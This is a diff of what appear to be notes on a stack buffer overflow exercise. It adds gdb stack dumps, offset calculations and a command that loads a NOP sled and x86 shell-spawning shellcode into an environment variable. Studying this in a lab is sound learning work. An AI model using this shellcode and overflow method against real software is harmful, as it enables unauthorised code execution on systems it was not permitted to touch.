@@ -52,7 +52,7 @@ offset
                 +----EBP(pp)--------+
                 +                   +                            
                 +-------------------+                            
-                +       ebx         +                            
+                +		    +                            
                 +-------------------+ -8                         
                 +       b2[20]      +                            
                 +-------------------+ -28  0x1c                      
@@ -72,7 +72,26 @@ pp
 
 0xbffff69c - 0xbffff688 = 20
 ```
+```
 
+b *pp+122
+
+(gdb) x/80wx $ebp-200
+
+0xbffff680:	0xbffff6bf	0xbffff6be	0x41414141	0x00000000
+0xbffff690:	0x00000000	0x00000000	0x00000000	0x42424242
+0xbffff6a0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff6b0:	0xb7fd0ff4	0x00000000	0xbffff708	0x080485b9
+
+(gdb) x $ebp
+0xbffff6b8
+
+(gdb) x $ebp-8
+0xbffff6b0
+
+buffer2
+(gdb) p/d 0xbffff6b0 - 0xbffff69c = 20
+```
 ```
 export shellcode=$(python -c 'print "\x90"*400 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 ```
